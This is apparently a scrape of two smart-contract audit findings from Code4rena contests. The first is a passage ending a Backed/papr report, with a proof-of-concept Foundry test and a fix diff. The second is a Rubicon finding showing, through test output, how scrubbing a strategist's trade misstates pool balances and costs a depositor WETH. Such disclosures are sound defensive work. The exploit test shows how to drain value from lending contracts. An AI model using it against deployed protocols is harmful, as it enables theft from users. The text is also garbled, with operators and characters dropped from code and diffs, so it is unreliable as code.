controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo);++        //!! borrower wins+        uint256 afterBalance = debtToken.balanceOf(borrower);+        assertEq(afterBalance beforeBalance, payouts);+        assertGt(payouts, 2.4e18);+    }++    function _addCollaterals() internal {+        vm.startPrank(borrower);+        nft.setApprovalForAll(address(controller), true);+        IPaprController.Collateral[] memory c = new IPaprController.Collateral[(2);+        c[0] = collateral;+        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft});+        controller.addCollateral(c);+        vm.stopPrank();+    }++    function _loanMaxAndSell() internal {+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({+            amount: controller.maxDebt(oraclePrice*2) 4,+            minOut: 1,+            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}),+            swapFeeTo: address(0),+            swapFeeBips: 0+        });+        vm.prank(borrower);+        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo);+    }+}```Test output:    Running 1 test for test/paprController/PoC.sol:PoC    PASS] testPoC() (gas: 720941)    Test result: ok. 1 passed; 0 failed; finished in 1.21sVS CodeThe debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.Implementation code:```soliditydiff --git a/src/PaprController.sol b/src/PaprController.solindex 284b3f4..d7e4cea 100644--a/src/PaprController.sol+++ b/src/PaprController.sol@@ -61,6 +61,8 @@ contract PaprController is     /// @dev account = asset = vaultInfo     mapping(address = mapping(ERC721 = IPaprController.VaultInfo)) private _vaultInfo;+    /// @dev account = asset = shortfall amount+    mapping(address = mapping(ERC721 = uint256)) private _shortfall;     /// @dev does not validate args     /// e.g. does not check whether underlying or oracleSigner are address(0)@@ -288,6 +290,8 @@ contract PaprController is         }         if (isLastCollateral && remaining != 0) {+            // increase shortfall+            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         }@@ -408,6 +412,10 @@ contract PaprController is         return _vaultInfo[account][asset];     }+    function shortfall(address account, ERC721 asset) external view returns (uint256) {+        return _shortfall[account][asset];+    }+     /// INTERNAL NON-VIEW ///     function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {@@ -543,7 +551,20 @@ contract PaprController is             // we owe them more papr than they have in debt             // so we pay down debt and send them the rest             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached);           papr.transfer(auction.nftOwner, totalOwed debtCached);++            uint256 payout = totalOwed debtCached;+            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract];+            if (burnShortfall = payout) {+                burnShortfall = payout;+            }+            if (burnShortfall  0) {+                // burn the previous shortfall+                PaprToken(address(papr)).burn(address(this), burnShortfall);+                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall;+            }+            if (payout  burnShortfall) {+                papr.transfer(auction.nftOwner, payout burnShortfall);+            }         } else {             // reduce vault debt             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed);```[Jeiwan (warden) commented(https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1369802651):  State mismanagement causes writing off of a bad debt while there's still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.[wilsoncusack (Backed) confirmed and commented(https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1370080925):  Agree with @Jeiwan. The `isLastCollateral` check should also check whether there is another auction ongoing: https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527*
"""
--------------------------------------------------
article section:
"""
Medium Severity

[M-15]

 Outstanding Amount Of A Pool Reduced Although Tokens Are Not Repaid

<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L213<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L294In the BathToken Contract, `outstandingAmount`  means the amount of tokens that have been taken out of a pool, but have not been repaid back to the pool yet. Additionally, `outstandingAmount` is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists per code comment.Placing new trade orders and scrubbing existing trade orders are essential for maintaining an effective market, thus they are the key operation of a Strategist and these activities are expected to be performed frequently.It was observed that the `outstandingAmount` of the pool was reduced prematurely when a trade order is scrubbed by strategist, thus making the `outstandingAmount` inaccurate.The following are the output of test script which will be used to demonstrate the issue.Assume that Alice deposited 50 WETH and 50 DAI, and Bob deposited 50 WETH and 50 DAI to their respective BathToken pools.At this point, as shown below, for both BathWETH and BathDAI pool: underlyingBalance = 100, balanceOf = 100, Outstanding Amount = 0.These values are correct as the users have deposited 100 and none of the funds have been utilised by the Strategist yet. No asset is escrowed in the orderbook yet. The orderbook is empty.Note: underlyingBalance = outstandingAmount + balanceOf```javascript--------------Order Book ---------------[-] asks index 0: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0[+] bids index 0: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0bathAssetInstance: underlyingBalance() = 100 WETH, balanceOf = 100 WETH, Outstanding Amount = 0 WETH | 0 DAI pending rebalancebathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 100 DAI, Outstanding Amount = 0 DAI | 0 WETH pending rebalanceOrder Book Escrowed 0 WETH and 0 DAI```The Strategist placed a market trade order, thus an ask and bid order was sent to the orderbook and 40 WETH and 40 DAI were escrowed in the orderbook.  Since 40 WETH and 40 DAI were utilised by the Strategist, the pool's `balanceOf` dropped from 100 to 60, and the outstanding amount increased from 0 to 40. The `underlyingBalance` remains at 100.```javascriptAfter Placing Order--------------Order Book ---------------[-] asks index 0: ask_pay_amt = 40, ask_buy_amt = 800[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0[+] bids index 0: bid_pay_amt = 40, bid_buy_amt = 4[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0bathAssetInstance: underlyingBalance() = 100 WETH, balanceOf = 60 WETH, Outstanding Amount = 40 WETH | 0 DAI pending rebalancebathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 60 DAI, Outstanding Amount = 40 DAI | 0 WETH pending rebalanceOrder Book Escrowed 40 WETH and 40 DAI```Charles decided to buy the ask order (OrderID = 1) in the orderbook, thus he paid 800 DAI and received 40 WETH. 40 WETH escrowed in the orderbook was released/transfered to Charles and the 800 DAI that Charles paid was redirected to BathWETH pool waiting to be rebalanced by Strategist. The ask order was removed from the orderbook since it had been fulfilled.At this point, the outstanding amount of BathWETH was 40 and this was correct since the BathWETH pool was still missing the 40 WETH that was taken out by the Strategist earlier, and had not been repaid back to the pool yet.Noted that there were 800 DAI sitting on the BathWETH pool, but understood that the `outstandingAmount` is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists.```javascriptAfter Charles brought the best ask order--------------Order Book ---------------[-] asks index 0: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0[+] bids index 0: bid_pay_amt = 40, bid_buy_amt = 4[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0bathAssetInstance: underlyingBalance() = 100 WETH, balanceOf = 60 WETH, Outstanding Amount = 40 WETH | 800 DAI pending rebalancebathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 60 DAI, Outstanding Amount = 40 DAI | 0 WETH pending rebalanceOrder Book Escrowed 0 WETH and 40 DAI```Strategist decided to scrub his trade order by calling `BathPair.scrubStrategistTrade()`, so any outstanding orders in the orderbook were cancelled. Therefore, the 40 DAI  escrowed in the orderbook was released back to the bathDAI pool. Thus, the bathDAI pool had a `balanceOf` = 100, and no outstanding amount since all the DAI had been repaid back.However, scrubbing a trade order has a unintended effect on the BathWETH pool. All the outstanding amount in BathWETH pool were cleared (changed from 40 to 0) although no WETH was repaid back to the BathWETH pool. The outstanding amount was inaccurate and did not reflect the actual amount not repaid back to the pool yet.Per the design, the only time that the WETH will be repaid back to BathWETH pool is when a strategist performs a rebalance to swap (either with other pool or external AMM) the 800 DAI (non-underlying asset) sitting on BathWETH pool.```javascriptStrategist scrub his trade order--------------Order Book ---------------[-] asks index 0: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 1: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 2: ask_pay_amt = 0, ask_buy_amt = 0[-] asks index 3: ask_pay_amt = 0, ask_buy_amt = 0[+] bids index 0: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 1: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 2: bid_pay_amt = 0, bid_buy_amt = 0[+] bids index 3: bid_pay_amt = 0, bid_buy_amt = 0bathAssetInstance: underlyingBalance() = 60 WETH, balanceOf = 60 WETH, Outstanding Amount = 0 WETH | 800 DAI pending rebalancebathQuoteInstance: underlyingBalance() = 100 DAI, balanceOf = 100 DAI, Outstanding Amount = 0 DAI | 0 WETH pending rebalanceOrder Book Escrowed 0 WETH and 0 DAI```The inaccurate outstanding amount of a pool casues unintended impact on a number of key functions (e.g. deposit, withdraw) of the protocol as they rely on the proper accounting of the `underlyingBalance` of a pool.Note: underlyingBalance = outstandingAmount + balanceOf (if outstandingAmount is wrong, the underlyingBalance would be wrong too)The following shows an example of the impact to Alice due to this issue. Alice who has earlier deposited 50 WETH to the BathWETH pool decided to withdraw all her investment.Note: Alice holds around 50% of the shares in the bathWETH pool. Fee is charged during pool withdrawal.*   First scenario If the strategist did not scrub his trade order at the first place, `underlyingBalance` of BathWETH pool will be 100, and she would received around 49 WETH back.*   Second scenario However, if the strategist srcubs his trade order, the bug will be triggered, and the `underlyingBalance` of BathWETH pool will change from 100 to 60. As shown in the output below, she will only received around 29 WETH if she withdraw all her investment.```javascriptAlice (accounts[1]) has 50 bathWETH and 50 bathDAIAlice (accounts[1]) has 0 WETH and 950 DAIAlice Attempting to withdraw all 50 bathWETH tokenAlice Succeed in withdrawing all bathWETH tokenAlice (accounts[1]) has 29.991 WETH and 950 DAI```Alice lost 20 WETH In the second scenario.Similar problem also affect the deposit function since it relies on the proper accounting of the underlying balance or outstanding amount too. The amount of BathToken (e.g. BathWETH) that depositer received might be affected.The following aims to explain why this issue occurred.When `BathPair.scrubStrategistTrade` is called, it will in turn call `BairPair.handleStratOrderAtID`. If an order has been filled, it will call `BathToken.removeFilledTradeAmount`<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L213```solidity/// @dev Cancels outstanding orders and manages the ledger of outstandingAmount() on bathTokens as Strategist Trades are cancelled/scrubbed or expiredfunction handleStratOrderAtID(uint256 id) internal {    StrategistTrade memory info = strategistTrades[id];    address _asset = info.askAsset;    address _quote = info.bidAsset;    address bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(        _asset    );    address bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(        _quote    );    order memory offer1 = getOfferInfo(info.askId); //ask    order memory offer2 = getOfferInfo(info.bidId); //bid    uint256 askDelta = info.askPayAmt offer1.pay_amt;    uint256 bidDelta = info.bidPayAmt offer2.pay_amt;    // if real    if (info.askId != 0) {        // if delta  0 delta is fill = handle any amount of fill here        if (askDelta  0) {            logFill(askDelta, info.strategist, info.askAsset);            IBathToken(bathAssetAddress).removeFilledTradeAmount(askDelta);            // not a full fill            if (askDelta != info.askPayAmt) {                IBathToken(bathAssetAddress).cancel(                    info.askId,                    info.askPayAmt.sub(askDelta)                );            }        }        // otherwise didn't fill so cancel        else {            IBathToken(bathAssetAddress).cancel(info.askId, info.askPayAmt); // pas amount too        }    }    ..SNIP..}````BathToken.removeFilledTradeAmount` will reduce the outstanding amount of the pool.<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L294```solidity/// @notice A function called by BathPair to maintain proper accounting of outstandingAmountfunction removeFilledTradeAmount(uint256 amt) external onlyPair {    outstandingAmount = outstandingAmount.sub(amt);    ..SNIP..}```Following test script is used to generate the output shown in the walkthrough<https://gist.github.com/xiaoming9090/f26e0d3ea365edc89b257d6c0aa54ac9Loss of fund for the users. Key protocol functions (e.g. deposit and withdraw) that rely on proper accounting of the underlying balance or outstanding amount do not function as expected.Update the systems to ensure that the `outstandingAmount` of the pool is reduced only when the outstanding amount of tokens have been repaid back.For instance, in the above example, the reduction should happen during rebalancing when the 800 DAI sitting on the bathWETH pool have been swapped for WETH, and the swapped WETH are replenished/repaid back to the pool. In this case, the `outstandingAmount` can be reduced accordingly.In the `BathPair.handleStratOrderAtID()`, remove the `BathToken.removeFilledTradeAmount` and only call `BathToken.removeFilledTradeAmount` in the `BathPair.rebalancePair` if tokens have been repaid back.[bghughes (Rubicon) acknowledged and commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/221#issuecomment-1146381614):  They are rebalanced in practice and the problem is it is impossible to distinguish between fill when thinking about a single strategist order. See #210(https://github.com/code-423n4/2022-05-rubicon-findings/issues/210)  Feature of this system to be fixed when the strategist is decentralized and no longer trusted. LMK if you want me to elaborate.[HickupHH3 (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/221#issuecomment-1161330121): Issue is similar to #210 but a lot more detailed. Although they describe the problem with a slight variation, the underlying impact is the same: there will be a growing disparity between the `outstandingAmount` and `underlyingBalance` until the strategist scrubs the trade.  Making this the primary issue.  Copying my comment in that issue regarding lowered severity: There is a trust assumption that the strategist has to actively and frequently do scrubStrategistTrade() to ensure the accounting difference isn't large.  It a bit of a gray area, but arguably can be viewed as a centralisation risk issue / rug vector if the strategist goes MIA. Hence, as per my reasoning outlined in #334(https://github.com/code-423n4/2022-05-rubicon-findings/issues/344), I'm downgrading the issue to Medium severity.*
"""
--------------------------------------------------